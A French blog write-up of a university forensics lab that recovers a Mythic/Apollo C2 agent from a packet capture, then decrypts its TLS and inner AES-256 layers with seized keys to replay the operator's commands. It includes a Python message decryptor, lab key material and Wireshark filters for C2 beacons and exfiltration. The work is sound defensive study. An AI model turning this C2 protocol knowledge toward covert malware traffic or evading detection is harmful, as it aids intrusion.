---
title: "Déchiffrer un C2 Mythic avec Wireshark"
date: 2026-07-07 20:00:00 -0500
draft: false
categories:
  - Write-up
  - Cybersecurity
tags:
  - Wireshark
  - Forensics
  - Malware
  - C2
  - Mythic
  - TLS
  - Cybersecurity
  - Write-up
author: 
- VincentPerreault
description: Comment nous avons extrait un agent Mythic/Apollo d'une capture réseau, prouvé qu'il n'avait pas été altéré, épluché deux couches de chiffrement pour rejouer les commandes de l'attaquant, et comment Wireshark s'est retrouvé devant un vrai tribunal.
toc: true
comments: false
image:
  path: MythicC2trident.png
  alt: Le logo Mythic C2, avec un petit spoiler...
---



Voici un write-up d'un travail d'équipe réalisé dans le cours INF807 (Criminalistique en sécurité des TI), où nous avons utilisé Wireshark non pas comme outil de dépannage réseau, mais comme instrument de criminalistique : pour prouver qu'un logiciel malveillant présenté comme preuve n'avait pas été trafiqué durant le transit, et pour retracer les actions d'un attaquant alors même que le canal de commande et contrôle était chiffré, et ce, à deux reprises.

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> Ce blog a temporairement été rédigé par l'IA, pour but de tester le radar visuel. Le blog écrit à la main arrivera prochainement.
{.prompt-danger }
<!-- markdownlint-restore -->

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> Tout ce qui suit se déroule dans un laboratoire fermé et fictif monté pour le cours. La « victime », l'infrastructure d'attaque et le maliciel sont tous les nôtres, créés à des fins éducatives. Rien ici ne vise une personne ou un système réel. Déchiffrer du trafic C2 est une compétence *défensive* et *criminalistique*, et c'est le seul angle sous lequel ce billet l'aborde.
{.prompt-warning }
<!-- markdownlint-restore -->

## La mise en situation 🎭

Notre groupe fictif, Hackerz807, est une entreprise canadienne qui vend (officiellement) des tests d'intrusion et des conseils en cybersécurité, avec « discrétion et confidentialité garanties ». En coulisse, ils exploitent une console centralisée Mythic C2 (v3.4.24) et une petite ménagerie d'agents, dont Apollo et Poseidon.

Pour cette mission, le laboratoire ressemble à ceci :

| Rôle | Machine | Détails |
|---|---|---|
| Attaquant (C2) | Kali Linux, `192.168.1.102` | Serveur Mythic en HTTPS/TLS 1.2 (443), plus un serveur de livraison HTTP sur 8000 |
| Cible | Windows, `192.168.1.101` | Exécute le payload `photo_reader.exe` (un agent Apollo) |
| Preuve | `INF807-Capture Mythic C2.pcapng` | Capture réseau complète de tout l'échange |

Toute l'histoire tient dans un seul fichier de capture : la victime télécharge `photo_reader.exe` depuis le serveur de livraison de l'attaquant en HTTP en clair, l'agent rappelle son serveur en HTTPS, et l'opérateur commence à envoyer des commandes. Notre travail d'analystes en criminalistique est de tout reconstituer après coup, en partant de rien d'autre que le `.pcapng` (puis, plus tard, de ce que la GRC a saisi sur le serveur).

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> Pourquoi Mythic ? Ce n'est pas un jouet académique. Team Cymru a publié une [étude de cas](https://www.team-cymru.com/post/mythic-case-study-assessing-common-offensive-security-tools) sur Mythic en 2022, et le cadriciel (de SpecterOps, les créateurs de BloodHound) a été associé à des activités malveillantes réelles comme *BazarLoader* et *UNC2165*. C'est un artéfact réaliste à devoir analyser.
{.prompt-info }
<!-- markdownlint-restore -->

## Deux questions auxquelles un analyste doit répondre ❓

Le projet se résumait à deux questions faussement simples, qui découlent toutes deux de la manière dont cette preuve serait contestée devant la Cour :

1. **Intégrité.** Si nous présentons `photo_reader.exe` comme preuve, comment *prouver* qu'il s'agit exactement du même fichier qui a transité sur le réseau, que personne (pas même les enquêteurs) ne l'a modifié entre le serveur de l'attaquant et la cible ?
2. **Reconstitution.** Comment retracer ce que le maliciel a réellement *fait*, alors que le canal C2 est chiffré ?

Wireshark répond aux deux. Prenons-les dans l'ordre.

## Étape 1 : extraire le maliciel et prouver son intégrité 🧬

La livraison se fait en clair. Un coup d'œil aux requêtes HTTP montre la cible qui contacte le serveur de livraison de l'attaquant :

```
GET http://192.168.1.102:8000/photo_reader.exe
→ 200 OK   application/x-msdos-program   2 161 664 octets
```

Comme c'est du HTTP en clair, Wireshark peut réassembler le fichier directement à partir des paquets. Dans File → Export Objects → HTTP, on choisit `photo_reader.exe` et on l'enregistre. Vous tenez maintenant les octets exacts qui ont traversé le réseau, sans jamais avoir à toucher au disque de la victime.

Vient ensuite la partie qui compte juridiquement : le hachage. À l'aide d'un outil comme *GtkHash* (ou `certutil -hashfile`, ou `sha1sum`), on prend l'empreinte numérique du fichier extrait :

```
photo_reader.exe   (2 161 664 octets, exécutable MZ)
MD5    d1017f0be2c8cbdae1e0c681b77a8ee9
SHA1   848db024596f9b498d1753cf2c3da9ee06184043
```

Et voici la chute. Entretemps, la GRC avait perquisitionné le serveur Mythic. La configuration serveur du payload, dans Mythic, enregistre les empreintes de chaque payload généré :

![La configuration du payload dans Mythic, montrant le SHA1 et le MD5 de photo_reader.exe côté serveur.](payload-config.png)
{ caption="Le propre registre de Mythic pour le payload qu'il a construit. Le SHA1 et le MD5 doivent correspondre au fichier extrait du réseau, et à la copie présente sur le disque de la victime." }

Les empreintes enregistrées par le serveur C2 (`SHA1 848db02459…184043`, `MD5 d1017f0be2…a8ee9`) sont rigoureusement identiques, octet pour octet, au fichier que j'ai extrait de la capture. Faites le même calcul sur la copie de la victime, et ça concorde aussi. Trois sources indépendantes (le serveur de l'attaquant, la capture réseau, le disque de la victime) s'accordent sur la même empreinte.

C'est tout le jeu. Cela signifie :

- le fichier est identifié de manière unique par son condensé ;
- son intégrité est prouvée : il n'a pas été modifié en transit, et tout aussi important, il n'a pas été modifié *par les enquêteurs* après la saisie ;
- il peut servir de preuve numérique dans le dossier remis à la Cour, parce que la chaîne de possession tient.

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> On ne travaille jamais sur la capture originale. L'original est scellé et haché pour préserver la chaîne de possession ; l'analyse se fait sur une copie de travail (« Fouille »), et le rapport d'expert est remis avec une copie distincte (« Enquête »). Si l'empreinte de votre copie d'analyse s'écarte un jour de celle de l'original, votre preuve est compromise, et votre crédibilité à la barre aussi.
{.prompt-warning }
<!-- markdownlint-restore -->

## Étape 2 : déchiffrer la couche HTTPS/TLS 🔓

Jusqu'ici tout va bien, mais la partie intéressante, le véritable commande et contrôle, transite en HTTPS sur le port 443. Dans la capture, ce n'est qu'un mur d'enregistrements `Application Data` : conversation TCP `192.168.1.101 ⇄ 192.168.1.102:443`, `POST /data` à l'infini, `200 OK` à l'infini, et pas un seul octet lisible.

Normalement, c'est ici que l'analyste reste coincé. Mais voici le cadeau criminalistique : la capture a été prise sur le serveur, et le serveur a journalisé ses clés de session TLS. C'est le fichier `tlskeys.log`, le format standard `SSLKEYLOGFILE`, qui consigne les secrets négociés lors de chaque poignée de main :

```
CLIENT_RANDOM 6997b5a2c7ee8301…8152333e 043936fccc000751…9987bd7
CLIENT_HANDSHAKE_TRAFFIC_SECRET …
SERVER_HANDSHAKE_TRAFFIC_SECRET …
CLIENT_TRAFFIC_SECRET_0 …
SERVER_TRAFFIC_SECRET_0 …
```

Wireshark peut utiliser ces clés pour déchiffrer la session après coup. On le pointe vers le fichier :

Edit → Preferences → Protocols → TLS → *(Pre)-Master-Secret log filename* → `tlskeys.log`

Dès qu'on l'applique, la capture se métamorphose. La poignée de main TLS 1.2 (autour des paquets 7499 à 7504 dans notre capture) est toujours là, mais tout ce qui suit cesse d'être de l'opaque `Application Data`. Les corps des `POST /data` et leurs réponses `200 OK` deviennent du HTTP parfaitement lisible.

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> Le fichier de clés contient les secrets de plusieurs sessions TLS. Celle qui nous intéresse est la session dont le `CLIENT_RANDOM` correspond à la conversation C2, dans notre cas celle qui se termine par `…8152333e`. Wireshark s'en occupe une fois le fichier chargé ; il suffit de savoir quelle conversation vous intéresse réellement (`ip.addr == 192.168.1.102 && tls`).
{.prompt-tip }
<!-- markdownlint-restore -->

Toute la prémisse de la « victime » (*« le trafic est chiffré, les policiers ne trouveront jamais aucune preuve contre nous ! »*) s'effondre à l'instant où ces clés sont sur la table. Mais déchiffrer TLS ne nous mène qu'à mi-chemin.

## Étape 3 : éplucher la *deuxième* couche (le chiffrement Apollo/Mythic) 🧅

Voici la subtilité qui rend Mythic intéressant. Même une fois TLS retiré, les corps des `POST /data` ne sont toujours pas en clair. Ils ressemblent à ceci :

```
NjRkZGUyMjctZjZlYy00YWQ5LTk1M2MtN2YxZTk5ZDk1Nzcw2K7p… (un long bloc base64)
```

C'est que Mythic ne fait pas confiance au transport. Par-dessus TLS, chaque agent chiffre ses messages avec sa propre clé AES-256 pré-partagée, l'*AESPSK*. TLS protège le tunnel ; l'AESPSK protège le message *à l'intérieur* du tunnel. Retirez l'un, l'autre reste. C'est exactement le genre de situation « chiffré même après l'avoir déchiffré » qui piège un analyste débutant.

Le schéma par défaut de Mythic est `aes256_hmac`, et le format de chaque message sur le fil est simple une fois qu'on le connaît :

```
base64(  UUID (36 caractères ASCII)  ||  IV (16 octets)  ||  texte chiffré AES-256-CBC  ||  HMAC-SHA256 (32 octets)  )
```

La même clé de 32 octets (l'AESPSK décodée du base64) sert à la fois à déchiffrer en AES-256-CBC le corps et à vérifier le HMAC sur `IV || texte chiffré`. Et l'AESPSK fait partie de ce que la GRC a récupéré sur le serveur saisi :

```
AESPSK (aes256_hmac) :  pYMtx7Bc2UMHE2jL7NnHRSDaL3IaPcyCF2oGuIbVVc8=
```

Pour transformer ce format en JSON lisible, j'ai écrit un petit déchiffreur. En restant fidèle à l'habitude de Mythic de nommer ses composantes d'après les dieux grecs (Apollo, Poseidon, Medusa…), j'ai appelé le mien Poseidon. Il prend les octets en hexadécimal que Wireshark affiche pour un corps de message et les ramène jusqu'au clair (`hex → base64 → AES-CBC → JSON`). La sortie est un peu brouillonne (du JSON échappé sur une seule ligne) mais tout à fait gérable :

```python
import base64, hmac, hashlib, json
from Crypto.Cipher import AES

KEY = base64.b64decode("pYMtx7Bc2UMHE2jL7NnHRSDaL3IaPcyCF2oGuIbVVc8=")  # 32 octets

def poseidon(hex_body: str) -> dict:
    msg  = base64.b64decode(bytes.fromhex(hex_body))   # UUID(36) + IV(16) + ct + HMAC(32)
    uuid, blob = msg[:36].decode(), msg[36:]
    iv, ct, mac = blob[:16], blob[16:-32], blob[-32:]
    assert hmac.compare_digest(hmac.new(KEY, iv + ct, hashlib.sha256).digest(), mac), "HMAC invalide"
    pt = AES.new(KEY, AES.MODE_CBC, iv).decrypt(ct)
    return uuid, json.loads(pt[:-pt[-1]])              # on retire le remplissage PKCS7
```

On lui donne le corps d'un `POST /data` (copié depuis Wireshark en hexadécimal, ou extrait automatiquement avec `tshark -T fields -e http.file_data`), et la conversation C2 se met enfin à parler.

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> La vérification du HMAC n'est pas décorative. Si elle réussit, vous avez *prouvé*, cryptographiquement, que le message a été produit par quelque chose détenant exactement cette clé, et que pas un seul octet n'a été altéré ensuite. C'est une affirmation criminalistique solide à pouvoir formuler au sujet d'une preuve chiffrée.
{.prompt-info }
<!-- markdownlint-restore -->

## Rejouer l'attaque à partir du flux déchiffré 🎬

Une fois les deux couches retirées, la capture se lit comme une transcription. Voici la séquence réelle, tirée directement de notre `.pcapng`.

Le premier enregistrement (check-in) est l'agent qui se présente au C2. Remarquez qu'il est signé avec l'UUID du *payload* (`64dde227-…`), le même que sur la capture d'écran plus haut :

```json
{
  "action": "checkin",
  "uuid": "64dde227-f6ec-4ad9-953c-7f1e99d95770",
  "host": "DESKTOP-GUFPUCS",
  "user": "WINDOWS-PC",
  "domain": "DESKTOP-GUFPUCS",
  "os": "Windows 10 Education 2009 6.2.9200.0",
  "architecture": "x64",
  "pid": 6728,
  "process_name": "photo_reader",
  "cwd": "C:\\Users\\WINDOWS-PC\\Downloads",
  "ips": ["192.168.1.101", "fe80::484a:dd16:6f56:ee54%12"]
}
```

Le serveur accuse réception et remet à l'agent un nouvel UUID de rappel pour le reste de la session :

```json
{ "action": "checkin", "status": "success", "id": "3e8ead26-f4fa-4c6e-8024-6018792dbb08" }
```

À partir de là, chaque message envoyé par l'agent est signé avec `3e8ead26-…`. L'agent s'installe ensuite dans une boucle d'interrogation (des `get_tasking` avec des listes de tâches vides) jusqu'à ce que l'opérateur tape quelque chose. Quand il le fait, la réponse à une interrogation cesse d'être vide :

```json
{ "action": "get_tasking",
  "tasks": [ { "command": "whoami", "parameters": "", "id": "17896512-…" } ] }
```

…et quelques instants plus tard, l'agent renvoie le résultat :

```json
{ "user_output": "Local Identity: DESKTOP-GUFPUCS\\WINDOWS-PC\nImpersonation Identity: DESKTOP-GUFPUCS\\WINDOWS-PC" }
```

En continuant de tirer le fil, toute la session de l'opérateur se déroule. Quelques exemples réels de notre capture :

- `whoami` → `DESKTOP-GUFPUCS\WINDOWS-PC`
- `ifconfig` → carte `Ethernet0`, `192.168.1.101`, *Intel(R) 82574L Gigabit Network Connection*, passerelle `192.168.1.1`
- `ls` (chemin `.`) → un listage complet du répertoire `C:\Users\WINDOWS-PC\Downloads`, incluant un suspect `camera-catalogue (1).exe` pesant exactement `2 161 664` octets, la même taille que notre payload.

Ce dernier point est le moment où la boucle se referme : la sortie du navigateur de fichiers, récupérée d'un trafic doublement chiffré, pointe directement vers une autre copie du maliciel logée dans le dossier Téléchargements de la victime. Nous avons reconstitué *ce que l'attaquant a vu et fait*, minute par minute, à partir d'un flux censé être illisible.

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> Envie du détail le plus élégant, en primeur ? ||Le tout premier message est chiffré avec l'UUID du payload parce que l'agent n'a pas encore d'identité de session, et l'UUID de rappel n'existe qu'après un check-in réussi. Si vous tentez de déchiffrer tout le flux avec un seul UUID, le premier paquet échoue et c'est la panique. L'UUID change littéralement en cours de conversation, et la capture montre le passage de relais exact.||
{.prompt-tip }
<!-- markdownlint-restore -->

## Quand Wireshark se retrouve devant un vrai tribunal : *R. c. Hughes* ⚖️

Tout cela soulève une question légitime : est-ce que quoi que ce soit là-dedans tient devant la Cour ? Oui, et il existe une affaire canadienne qui l'illustre magnifiquement : **_R. c. Hughes_, [2022 ONSC 5209](https://canlii.ca/t/jxfkv).**

Les faits, en bref. En juillet 2017, la *Internet Crimes Against Children* (ICAC) Joint Task Force américaine alerte la Police provinciale de l'Ontario (OPP) qu'une adresse IP ontarienne sur BitTorrent est liée à de la pornographie juvénile (par. 3). Un enquêteur de l'OPP utilise un outil des forces de l'ordre appelé Torrential Downpour (TD) pour se connecter à cette IP et télécharger les fichiers signalés (par. 4). Un mandat de perquisition suit, l'ordinateur de l'accusé est saisi avec les mêmes fichiers, et M. Hughes est accusé en vertu de l'article 163.1 du Code criminel de possession et de mise à disposition.

Voici en quoi c'est pertinent pour notre projet : Torrential Downpour est, à bien des égards, un outil de commande et contrôle lui aussi, un contrôleur qui se connecte à un hôte distant et en tire des données précises, exactement le schéma que nous venons de disséquer avec Mythic. Et la défense a fait ce que toute bonne défense fait : elle a demandé le code source de TD et de son module récepteur TDR (des logiciels fournis gratuitement aux policiers via le système *ICACCOPS*, par. 6, 38) pour vérifier si l'outil faisait quelque chose qu'il n'aurait pas dû. La Couronne a refusé, invoquant le privilège de technique d'enquête (par. 7).

Alors, comment prouver que l'outil s'est bien comporté, sans en divulguer le code source ? On le regarde travailler avec Wireshark. Giuseppe Versace, chef de projet à l'Unité d'exploitation sexuelle des enfants de l'OPP, a conçu un protocole de validation : trois tests, exécutés le 9 juin 2022 sur deux machines virtuelles (par. 64-65), Wireshark capturant tout ce que l'outil faisait sur le réseau. Les captures ont confirmé deux points centraux du dossier : que TD ne laisse aucun artéfact sur la cible, et ne télécharge que le fichier visé, rien de plus.

La résolution de la Cour est la partie à retenir :

- Le code source demeure privilégié : c'est une technique d'enquête protégée, et sa divulgation a été refusée (par. 236).
- Mais les résultats d'analyse doivent être divulgués à la défense : les manuels de TD/TDR (par. 14a), des milliers de pages de journaux d'interactions, l'appareil de l'accusé (par. 76), et surtout les rapports de validation, y compris les captures de paquets Wireshark (par. 240).

Autrement dit, la capture de paquets est devenue le pont entre « faites confiance à notre outil secret » et « voici une preuve vérifiable de façon indépendante de ce qu'il a exactement fait ». C'est Wireshark accomplissant précisément le travail criminalistique que nous avons fait en laboratoire, prouver à partir du réseau ce qu'un logiciel fait réellement, sauf qu'ici, c'est la liberté de quelqu'un qui est en jeu.

## Conclusion 🧭

Wireshark a été conçu en 1997 pour dépanner les réseaux. Un quart de siècle plus tard, c'est un instrument criminalistique légitime, et ce projet nous a permis d'en exercer trois facettes d'un coup :

- **Intégrité** : extraire un échantillon de maliciel directement d'une capture et prouver, par le hachage, qu'il est identique à l'original saisi et à la copie de la victime.
- **Analyse malgré le chiffrement** : retirer TLS grâce aux clés de session journalisées, puis retirer la propre couche AES-256 de Mythic grâce à la PSK récupérée, pour transformer un flux opaque en transcription complète des commandes de l'attaquant.
- **Poids judiciaire** : comme le montre *R. c. Hughes*, une capture Wireshark peut être la preuve divulgable et vérifiable de façon indépendante qui permet à un tribunal de faire confiance à un outil secret sans l'exposer.

La leçon la plus utile ? Déchiffrer TLS n'est pas la ligne d'arrivée. Les cadriciels C2 modernes présument que le tunnel sera brisé et chiffrent de nouveau en dessous. L'analyste qui s'arrête à la première couche voit du bruit base64 et conclut qu'il n'y a rien ; celui qui sait chercher la seconde couche, et qui a la clé, reconstitue le crime en entier.

## Annexe : des filtres Wireshark qui ont fait leurs preuves 🧰

| Objectif | Filtre |
|---|---|
| Repérer les beacons C2 (données allant *vers* le serveur) | `http.request.method == "POST"` |
| Isoler tout le trafic avec l'hôte C2 | `ip.addr == 192.168.1.102 && http` |
| Voir tous les *Client Hello* TLS | `tls.handshake.type == 1` |
| Ne garder que TLS 1.2 | `tls.handshake.extensions.supported_version == 0x0303` |
| Traquer les requêtes DNS suspectes | `dns.qry.name contains "suspicious"` |
| Attraper les gros transferts d'exfiltration | `tcp.len > 1000 && ip.dst == 192.168.1.102` |
| Cadrer l'incident dans le temps | `frame.time >= "2026-02-21 06:00:00"` |

## En résumé 🎯

- Extraction de `photo_reader.exe` (un agent Mythic Apollo) d'un `.pcapng` et preuve par MD5/SHA1 que la copie du réseau, la copie du serveur saisi et la copie de la victime sont le même fichier (chaîne de possession intacte).
- Déchiffrement du C2 en HTTPS/TLS 1.2 avec les clés de session journalisées par le serveur (`SSLKEYLOGFILE` → *(Pre)-Master-Secret log filename*).
- Épluchage de la deuxième couche (l'AESPSK `aes256_hmac` de Mythic) avec un court déchiffreur Python, récupérant le check-in et un historique complet de commandes (`whoami`, `ifconfig`, `ls`).
- *R. c. Hughes* (2022 ONSC 5209) montre la même technique dans un vrai tribunal : Wireshark a validé un outil policier de type C2 sans en divulguer le code source.
- Grande leçon : briser TLS est la première étape, pas tout le travail. Attendez-vous à une seconde couche de chiffrement en dessous.

Envie d'essayer par vous-même ? Nous avons monté une salle privée sur TryHackMe : [INF807 – Groupe E – Wireshark](https://tryhackme.com/room/inf807groupeewireshark).

Merci d'avoir lu jusqu'ici. Si vous ne retenez qu'une habitude de tout ça, que ce soit le réflexe de demander *« et qu'y a-t-il sous le chiffrement que je viens de retirer ? »* C'est toute la différence entre « le trafic était chiffré » et une reconstitution complète de l'attaque.
